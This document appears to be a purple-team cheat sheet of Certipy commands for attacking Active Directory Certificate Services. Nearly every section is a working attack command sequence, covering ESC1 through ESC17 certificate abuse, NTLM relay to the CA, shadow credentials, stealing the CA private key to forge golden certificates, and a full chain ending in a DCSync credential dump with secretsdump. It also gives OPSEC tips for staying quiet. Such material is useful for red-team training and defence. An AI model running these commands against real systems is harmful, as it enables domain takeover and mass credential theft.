# Certipy — Hands-On Use Cases

Every command below is verified against [`ly4k/Certipy`](https://github.com/ly4k/Certipy)'s source (`certipy/commands/*.py`, `certipy/lib/*.py`) and its GitHub wiki (`06 - Privilege Escalation`, `07 - Post-Exploitation`, `08 - Command Reference`). Switch names, defaults, and output filenames match the source exactly.

## Contents
- [Enumerating AD CS Configuration](#enumerating-ad-cs-configuration)
- [Offline Analysis From a C2 Implant's Registry Collection](#offline-analysis-from-a-c2-implants-registry-collection)
- [ESC1 — Enrollee-Supplied Subject Abuse](#esc1--enrollee-supplied-subject-abuse)
- [ESC3 — Enrollment Agent On-Behalf-Of Requests](#esc3--enrollment-agent-on-behalf-of-requests)
- [ESC4 — Template Hijacking via Weak ACL](#esc4--template-hijacking-via-weak-acl)
- [ESC6 + ESC9 Combined — CA-Level SAN Injection Bypassing Full Enforcement](#esc6--esc9-combined--ca-level-san-injection-bypassing-full-enforcement)
- [ESC7 — Abusing CA Officer Rights](#esc7--abusing-ca-officer-rights)
- [ESC8 — NTLM Relay to AD CS Web Enrollment](#esc8--ntlm-relay-to-ad-cs-web-enrollment)
- [ESC11 — NTLM Relay to the CA's RPC Interface](#esc11--ntlm-relay-to-the-cas-rpc-interface)
- [ESC13 — Issuance Policy Group-Link Abuse](#esc13--issuance-policy-group-link-abuse)
- [ESC15 — Arbitrary Application Policy Injection ("EKUwu")](#esc15--arbitrary-application-policy-injection-ekuwu)
- [ESC17 — Impersonating a Server Identity (WSUS)](#esc17--impersonating-a-server-identity-wsus)
- [Shadow Credentials — Account Takeover and Persistence](#shadow-credentials--account-takeover-and-persistence)
- [Stealing the CA's Private Key and Forging a Golden Certificate](#stealing-the-cas-private-key-and-forging-a-golden-certificate)
- [Authenticating and Redeeming a Certificate](#authenticating-and-redeeming-a-certificate)
- [Schannel LDAP Shell Instead of Kerberos](#schannel-ldap-shell-instead-of-kerberos)
- [Rogue Machine Account Creation](#rogue-machine-account-creation)
- [Chained Workflow — Enumeration to Domain Compromise](#chained-workflow--enumeration-to-domain-compromise)

---

## Enumerating AD CS Configuration

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Domain Account Discovery), [T1069.002](https://attack.mitre.org/techniques/T1069/002/) (Permission Groups Discovery: Domain Groups)

```bash
certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -text -enabled -hide-admins -vulnerable
```

Full LDAP enumeration of every CA and template, filtered to enabled + vulnerable + admin-noise-suppressed. With no `-text`/`-json`/`-csv` flags, this same command would instead write **both** a timestamped `.txt` and `.json` file by default (see `01`). Add `-dc-only` to skip the CA server entirely when the CA is more closely watched than the DC:

```bash
certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -dc-only -json
```

## Offline Analysis From a C2 Implant's Registry Collection

**MITRE ATT&CK:** [T1012](https://attack.mitre.org/techniques/T1012/) (Query Registry), [T1069.002](https://attack.mitre.org/techniques/T1069/002/)

```bash
# Registry export collected via a C2 implant already on a domain-joined host,
# with zero LDAP/RPC traffic from Certipy reaching the target
certipy parse ca_registry.reg -format reg -domain corp.local -ca CORP-CA -vulnerable

# Outflank C2's own registry-query BOF output, parsed identically
certipy parse oc2_output.bin -format oc2_bof -domain corp.local -ca CORP-CA

# Cross-reference against a live BloodHound "owned" dataset instead of
# manually supplying -sids
certipy parse ca_registry.reg -format reg -domain corp.local -ca CORP-CA \
    -use-owned-sids -neo4j-user neo4j -neo4j-pass BloodHoundPass123 -vulnerable
```

Runs the identical vulnerability classifier `find` uses, but entirely offline — useful once a C2 implant (Cobalt Strike, Outflank C2) has already pulled the CA's registry values via its own BOF tradecraft, avoiding a second, separate LDAP/RPC touch from the operator's own machine.

## ESC1 — Enrollee-Supplied Subject Abuse

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates)

```bash
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'

certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

`req` requests against a template flagged `ESC1` by `find`, naming `administrator@corp.local`'s UPN and SID as the SAN — the CA issues the cert without ever verifying the requester actually is Administrator. Output saves as `administrator.pfx` (derived from the certificate's own identity, not the requester's — see `01`). `auth` then redeems it for a TGT plus the account's NT hash via U2U.

## ESC3 — Enrollment Agent On-Behalf-Of Requests

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```bash
# Step 1: obtain an Enrollment Agent certificate from a template with the
# Certificate Request Agent EKU
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'EnrollAgent'

# Step 2: use it to request a certificate on behalf of Administrator, without
# ever authenticating as Administrator
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'

certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

The held Enrollment Agent cert (`-pfx`) co-signs the on-behalf-of request — the CA trusts the agent cert's own EKU rather than requiring the target's own credentials at all.

## ESC4 — Template Hijacking via Weak ACL

**MITRE ATT&CK:** [T1484.001](https://attack.mitre.org/techniques/T1484/001/) (Group Policy Modification is the closest analog; ATT&CK has no dedicated AD-object-ACL-abuse ID — commonly cited alongside T1098 Account Manipulation)

```bash
# Rewrite a template you have WriteDacl/WriteOwner/GenericAll over into an
# ESC1-shaped configuration
certipy template -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -template 'SecureFiles' -write-default-configuration

certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'SecureFiles' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'

certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

`-write-default-configuration` doesn't restore anything — it **overwrites** the template's live config with a deliberately ESC1-vulnerable one (enrollee-supplies-subject, client-auth EKU, no approval gate). Save the original config first with `-save-configuration original.json` if OPSEC/cleanup matters, and restore it afterward with `-write-configuration original.json`.

## ESC6 + ESC9 Combined — CA-Level SAN Injection Bypassing Full Enforcement

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```bash
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'ESC9Template' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'

certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

Works even when DCs are in `StrongCertificateBindingEnforcement=2` (Full Enforcement): the ESC9 template omits the SID security extension, but the CA's own ESC6 misconfiguration lets Certipy inject the target SID as a SAN URL (`URL=tag:microsoft.com,2022-09-14:sid:...`) instead — the KDC falls back to that URL SID since the dedicated extension is absent. `certipy req`'s console output will explicitly print `Certificate object SID is 'S-1-5-21-...-500'` when this path fires, confirming the SAN-URL injection succeeded.

## ESC7 — Abusing CA Officer Rights

**MITRE ATT&CK:** [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation)

```bash
certipy ca -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -ca 'CORP-CA' -enable-template 'SubCA'

certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'SubCA' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'

certipy ca -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -ca 'CORP-CA' -issue-request <REQUEST_ID>

certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -retrieve <REQUEST_ID>

certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

A principal holding `ManageCA`/`ManageCertificates` (the ESC7 condition) can publish a normally-unavailable template like the built-in `SubCA` (which grants full CA-issuing capability to whoever holds the resulting cert), then approve their own pending request instead of waiting on a legitimate manager.

## ESC8 — NTLM Relay to AD CS Web Enrollment

**MITRE ATT&CK:** [T1557](https://attack.mitre.org/techniques/T1557/) (Adversary-in-the-Middle), [T1649](https://attack.mitre.org/techniques/T1649/)

```bash
# Listener
certipy relay -target 'http://ca.corp.local' -template 'DomainController'

# Separately (a different tool): coerce a DC's machine account to authenticate
# to the listener, e.g. via PetitPotam or Coercer
```

Once coerced NTLM authentication lands on the listener, Certipy relays it to `/certsrv/certfnsh.asp`, requests the specified template in the coerced principal's context, and saves `dc$.pfx` — usable with `certipy auth` for full Domain Controller impersonation.

## ESC11 — NTLM Relay to the CA's RPC Interface

**MITRE ATT&CK:** [T1557](https://attack.mitre.org/techniques/T1557/), [T1649](https://attack.mitre.org/techniques/T1649/)

```bash
certipy relay -target 'rpc://ca.corp.local' -ca 'CORP-CA' -template 'DomainController'
```

Same relay engine as ESC8, but the `rpc://` scheme routes to the CA's ICPR RPC interface instead of the web endpoint — exploitable only when the CA hasn't set `IF_ENFORCEENCRYPTICERTREQUEST`. `-ca` becomes mandatory for this path (the RPC interface needs the CA's own name to route the request correctly, unlike the web path which resolves it from the URL).

## ESC13 — Issuance Policy Group-Link Abuse

**MITRE ATT&CK:** [T1078.002](https://attack.mitre.org/techniques/T1078/002/) (Valid Accounts: Domain Accounts) — the resulting TGT carries a privileged group SID without ever modifying real group membership

```bash
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'SecureAdminsAuthentication'

certipy auth -pfx 'attacker.pfx' -dc-ip '10.0.0.100'

export KRB5CCNAME=user.ccache
secretsdump.py -just-dc-user 'dc$' 'corp.local/attacker@dc.corp.local' \
    -dc-ip '10.0.0.100' -target-ip '10.0.0.100' -k -no-pass
```

No SAN manipulation needed — the template's own linked Issuance Policy OID (surfaced by `find -oids`) grants the KDC-side group membership automatically once the resulting TGT is used. The final step chains into `Impacket/secretsdump/` (cross-linked, not re-derived) if the linked group carries DCSync rights.

## ESC15 — Arbitrary Application Policy Injection ("EKUwu")

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) — implements CVE-2024-49019

```bash
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'

certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

`-application-policies` injects the Client Authentication OID (`1.3.6.1.5.5.7.3.2`) into a Schema v1 "WebServer"-style template's request — on an unpatched CA (pre-November 2024), the CA doesn't validate the injected policy against the template's intended EKU set at all. Only works against CAs missing the CVE-2024-49019 fix.

## ESC17 — Impersonating a Server Identity (WSUS)

**MITRE ATT&CK:** [T1557](https://attack.mitre.org/techniques/T1557/), [T1210](https://attack.mitre.org/techniques/T1210/) (Exploitation of Remote Services) once the impersonated server is used for update-injection

```bash
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'VulnServerTemplate' \
    -dns 'wsus.corp.local'
```

Distinct from ESC1: the target EKU is **Server Authentication**, not client authentication, and there's no `-upn`/`-sid` step — the goal is impersonating the *server* (e.g. an internal WSUS host) for TLS, not impersonating a *user* for Kerberos. The resulting `wsus.pfx` is then used to stand up a malicious TLS listener that either relays incoming WSUS client requests to LDAP, or serves a malicious "update" achieving code execution on any client that trusts the real WSUS server — both documented externally, outside Certipy's own scope (see `01`'s ESC17 row for citations).

## Shadow Credentials — Account Takeover and Persistence

**MITRE ATT&CK:** [T1098.001](https://attack.mitre.org/techniques/T1098/001/) (Account Manipulation: Additional Cloud Credentials — closest ATT&CK analog for a Key-Credential-based takeover), [T1649](https://attack.mitre.org/techniques/T1649/)

```bash
# One-shot takeover, given GenericWrite/WriteProperty on 'victim'
certipy shadow -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -account 'victim' auto

# Manual: write, list, then remove a specific Key Credential
certipy shadow -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -account 'victim' add
certipy shadow -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -account 'victim' list
certipy shadow -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -account 'victim' -device-id 'f4474290-e5a0-ea54-3858-82e68421a13d' remove
```

`auto` obtains `victim.pfx` and `victim.ccache` without ever knowing or resetting the victim's password — the resulting RSA-2048 self-signed cert is valid for roughly 80 years by default (see `01`), making this a durable persistence primitive that survives a normal password rotation entirely.

## Stealing the CA's Private Key and Forging a Golden Certificate

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```bash
certipy ca -u 'administrator@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -ca 'CORP-CA' -backup

certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' \
    -sid 'S-1-5-21-...-500' -crl 'ldap:///'

certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.0.0.100'
```

Requires local-admin-equivalent access to the CA server already (post-compromise, not initial foothold — see `01`'s Red Flag callout for exactly what `-backup` does on the wire). `forge` is then fully offline — no LDAP, no RPC, no CA contact of any kind — able to mint a cert for **any** identity in the domain, structurally identical to a Golden Ticket forged from a stolen `krbtgt` key.

## Authenticating and Redeeming a Certificate

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material — closest analog for cert-to-Kerberos exchange)

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

Standard redemption path used throughout this file: PKINIT for a TGT, then U2U for the NT hash. `-no-hash` skips the hash-recovery step (quieter — one fewer TGS-REQ); `-username`/`-domain` disambiguate when the certificate's own SAN doesn't cleanly map to one principal.

## Schannel LDAP Shell Instead of Kerberos

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/)

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

Authenticates over TLS directly to LDAPS (636) using the certificate for Schannel client-cert auth, dropping into an interactive `#` prompt for LDAP operations as the mapped identity — no Kerberos AS-REQ/TGS-REQ at all. This is the exploitation step for ESC10 (weak Schannel UPN mapping) and for using a stolen machine-account certificate for direct LDAP access.

## Rogue Machine Account Creation

**MITRE ATT&CK:** [T1136.002](https://attack.mitre.org/techniques/T1136/002/) (Create Account: Domain Account)

```bash
certipy account -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -user 'ATTACKERPC$' -dns 'attackerpc.corp.local' create
```

Creates a new computer account (subject to `ms-DS-MachineAccountQuota`, default 10 per authenticated user) with a randomly generated 16-character password if `-pass` isn't supplied — a foothold account usable for further template-enrollment testing or as a staging identity for other AD CS attacks.

## Chained Workflow — Enumeration to Domain Compromise

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/), [T1649](https://attack.mitre.org/techniques/T1649/), [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)

```bash
# 1. Enumerate and find an ESC1-vulnerable template
certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -vulnerable -text

# 2. Exploit it, impersonating a Domain Admin
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'

# 3. Redeem for a TGT and NT hash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'

# 4. DCSync using the recovered TGT
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass 'corp.local/administrator@dc.corp.local' \
    -just-dc -dc-ip '10.0.0.100'
```

The realistic end-to-end chain: `certipy find` (recon) → `certipy req` (ESC1 exploitation) → `certipy auth` (cert-to-Kerberos redemption) → `secretsdump.py -just-dc` (full domain credential extraction) — each tool already documented in its own folder, chained here rather than re-derived. See `Purple Teaming/GhostPack/Certify/02 - Hands-On Use Cases.md` for the mirror-image chain on the Windows/Certify side, which lands on the identical `Rubeus.exe asktgt /certificate:` redemption step instead of `certipy auth`.
